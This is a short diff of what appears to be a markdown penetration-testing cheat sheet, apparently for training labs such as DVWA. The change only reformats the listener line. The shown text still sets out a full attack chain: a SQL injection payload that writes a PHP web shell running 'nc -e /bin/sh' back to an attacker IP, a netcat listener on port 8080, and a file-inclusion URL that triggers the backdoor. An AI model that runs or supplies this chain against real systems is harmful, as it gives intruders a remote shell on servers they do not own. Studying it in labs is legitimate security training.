@@ -62,8 +62,8 @@ IF(0,name,age)
 - Shell upload 
   - Payload 
     - ```?page=user-info.php&username=z' union select '<?passthru("nc -e /bin/sh 10.20.14.208 8080");?>',null into outfile '/tmp/reverse.php'``` 
-  - Listen on attacker machin:
-    - nc -vv -l -p 8080
+  - Listen on attacker machin
+    - ```nc -vv -l -p 8080```
   - Run backdoor
     - ```10.20.14.211/dvwa/vulnerabilities/fi/?page=../../../../../tmp/reverse.php```
 
